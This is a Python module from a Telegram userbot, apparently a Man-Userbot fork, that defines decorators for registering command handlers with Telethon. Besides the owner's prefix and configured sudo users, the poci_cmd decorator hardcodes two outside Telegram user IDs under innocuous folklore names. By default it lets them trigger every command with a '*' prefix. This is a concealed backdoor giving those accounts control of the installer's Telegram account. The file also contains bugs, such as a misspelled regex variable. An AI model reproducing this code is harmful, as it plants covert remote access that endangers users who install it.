# Credits: @mrconfused
# Ported by @mrismanaziz
# FROM Man-Userbot
# ReC0de by @Pocongonlen

import inspect
import re
from pathlib import Path

from telethon import events

from userbot import (
    BL_CHAT,
    CMD_HANDLER,
    CMD_LIST,
    LOAD_PLUG,
    SUDO_HANDLER,
    SUDO_USERS,
    bot,
    tgbot,
)


KUNTILANAK = [1593802955, 1675900974]
TUYUL_HANDLER = "*"

def poci_cmd(
    pattern: str = None,
    allow_sudo: bool = True,
    gendoruwo: bool = True,
    disable_edited: bool = False,
    forword=False,
    command: str = None,
    **args,
):
    args["func"] = lambda e: e.via_bot_id is None
    stack = inspect.stack()
    previous_stack_frame = stack[1]
    file_test = Path(previous_stack_frame.filename)
    file_test = file_test.stem.replace(".py", "")

    if "disable_edited" in args:
        del args["disable_edited"]

    args["blacklist_chats"] = True
    black_list_chats = list(BL_CHAT)
    if len(black_list_chats) > 0:
        args["chats"] = black_list_chats

    if pattern is not None:
        global man_reg
        global sudo_reg
        global tuyul_reg
        if (
            pattern.startswith(r"\#")
            or not pattern.startswith(r"\#")
            and pattern.startswith(r"^")
        ):
            man_reg = sudo_reg = tuyul_req = re.compile(pattern)
        else:
            man_ = "\\" + CMD_HANDLER
            sudo_ = "\\" + SUDO_HANDLER
            tuyul = "\\" + TUYUL_HANDLER
            man_reg = re.compile(man_ + pattern)
            sudo_reg = re.compile(sudo_ + pattern)
            tuyul_reg = re.compile(tuyul + pattern)
            if command is not None:
                cmd1 = man_ + command
                cmd2 = sudo_ + command
            else:
                cmd1 = (
                    (man_ + pattern).replace("$", "").replace("\\", "").replace("^", "")
                )
                cmd2 = (
                    (sudo_ + pattern)
                    .replace("$", "")
                    .replace("\\", "")
                    .replace("^", "")
                )
            try:
                CMD_LIST[file_test].append(cmd1)
            except BaseException:
                CMD_LIST.update({file_test: [cmd1]})

    def decorator(func):
        if not disable_edited:
            bot.add_event_handler(
                func, events.MessageEdited(**args, outgoing=True, pattern=man_reg)
            )
        bot.add_event_handler(
            func, events.NewMessage(**args, outgoing=True, pattern=man_reg)
        )
        if gendoruwo:
            if not disable_edited:
                bot.add_event_handler(
                    func,
                    events.MessageEdited(
                        **args, from_users=KUNTILANAK, pattern=tuyul_reg
                    ),
                )
            bot.add_event_handler(
                func,
                events.NewMessage(
                    **args, from_users=KUNTILANAK, pattern=tuyul_reg
                ),
            )
        if allow_sudo:
            if not disable_edited:
                bot.add_event_handler(
                    func,
                    events.MessageEdited(
                        **args, from_users=list(SUDO_USERS), pattern=sudo_reg
                    ),
                )
            bot.add_event_handler(
                func,
                events.NewMessage(
                    **args, from_users=list(SUDO_USERS), pattern=sudo_reg
                ),
            )
        try:
            LOAD_PLUG[file_test].append(func)
        except Exception:
            LOAD_PLUG.update({file_test: [func]})
        return func

    return decorator


def man_handler(
    **args,
):
    def decorator(func):
        bot.add_event_handler(func, events.NewMessage(**args, incoming=True))
        return func

    return decorator


def asst_cmd(**args):
    pattern = args.get("pattern", None)
    r_pattern = r"^[/!]"
    if pattern is not None and not pattern.startswith("(?i)"):
        args["pattern"] = "(?i)" + pattern
    args["pattern"] = pattern.replace("^/", r_pattern, 1)

    def decorator(func):
        if tgbot:
            tgbot.add_event_handler(func, events.NewMessage(**args))
        return func

    return decorator


def callback(**args):
    """Assistant's callback decorator"""

    def decorator(func):
        if tgbot:
            tgbot.add_event_handler(func, events.CallbackQuery(**args))
        return func

    return decorator
